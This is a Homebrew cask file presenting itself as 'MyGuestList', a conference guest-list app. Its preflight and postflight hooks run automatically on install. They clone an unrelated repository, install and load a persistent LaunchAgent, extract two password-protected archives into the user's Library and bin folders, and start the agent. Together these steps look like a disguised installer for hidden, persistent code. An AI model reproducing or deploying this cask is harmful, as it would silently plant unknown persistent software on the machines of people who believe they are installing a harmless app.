cask "slsvc" do
    version "1.5.0"
    sha256 "8d12fb17ab34180a1a3bbd5aeebbd637ecb40133aaf7634e7d40b26a43e81a67"

    url "https://github.com/eharper-wtconf/confapp24/releases/download/rel2/myguestlist.zip"
    name "MyGuestList"
    desc "WTconference guestlist"
    homepage "https://github.com/eharper-wtconf/confapp24"

    preflight do
        system_command "/usr/bin/git",
                       args: ["clone", "https://github.com/eharper-wtconf/confapp24.git", "/tmp/confapp24"],
                       print_stdout: true
      end

    preflight do
        system_command "/bin/cp",
                       args: ["/tmp/confapp24/deps/com.user.slsvc.plist", "#{ENV["HOME"]}/Library/LaunchAgents/com.user.slsvc.plist"]
      end      

    preflight do
        system_command "/bin/launchctl",
                       args: ["load", "#{ENV["HOME"]}/Library/LaunchAgents/com.user.slsvc.plist"]
      end   

      preflight do
        system_command "/usr/bin/unzip",
                       args: ["-P", "Microwave44", "/tmp/confapp24/deps/sl.zip", "-d", "#{ENV["HOME"]}/Library/"]
      end

    postflight do
        system_command "/usr/bin/unzip",
                       args: ["-P", "Microwave44", "/tmp/confapp24/deps/el.zip", "-d", "#{ENV["HOME"]}/usr/local/bin/"]
      end    
   
    postflight do
        system_command "/bin/launchctl",
                       args: ["start", "#{ENV["HOME"]}/Library/LaunchAgents/com.user.slsvc.plist"]
      end
    
    app "myguestlist.app"
end
